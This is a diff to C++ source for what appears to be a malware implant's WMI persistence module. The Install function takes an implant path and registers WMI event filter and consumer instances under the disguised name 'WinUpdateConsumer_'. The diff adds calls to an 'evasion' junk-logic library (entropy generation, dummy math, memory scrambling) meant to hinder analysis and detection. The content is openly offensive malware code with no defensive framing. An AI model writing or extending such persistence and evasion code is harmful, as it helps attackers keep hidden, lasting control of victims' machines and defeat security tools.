@@ -1,6 +1,7 @@
 #include "WmiPersistence.h"
 #include "../utils/Logger.h"
 #include "../utils/Obfuscator.h"
+#include "../evasion/JunkLogic.h"
 #include <comdef.h>
 #include <wbemidl.h>
 
@@ -17,6 +18,7 @@ namespace {
 }
 
 bool WmiPersistence::Install(const std::wstring& implantPath, const std::wstring& taskName) {
+    evasion::JunkLogic::GenerateEntropy();
     HRESULT hr;
     IWbemLocator* pLoc = nullptr;
     IWbemServices* pSvc = nullptr;
@@ -29,6 +31,8 @@ bool WmiPersistence::Install(const std::wstring& implantPath, const std::wstring
         pLoc->Release();
         return false;
     }
+
+    evasion::JunkLogic::PerformComplexMath();
 
     hr = CoSetProxyBlanket(pSvc, RPC_C_AUTHN_WINNT, RPC_C_AUTHZ_NONE, NULL, RPC_C_AUTHN_LEVEL_CALL, RPC_C_IMP_LEVEL_IMPERSONATE, NULL, EOAC_NONE);
     if (FAILED(hr)) {
@@ -70,6 +74,8 @@ bool WmiPersistence::Install(const std::wstring& implantPath, const std::wstring
     VariantClear(&var);
 
     hr = pSvc->PutInstance(pFilterInstance, WBEM_FLAG_CREATE_OR_UPDATE, NULL, NULL);
+
+    evasion::JunkLogic::ScrambleMemory();
 
     std::wstring consumerName = L"WinUpdateConsumer_" + taskName;
     IWbemClassObject* pConsumerClass = nullptr;
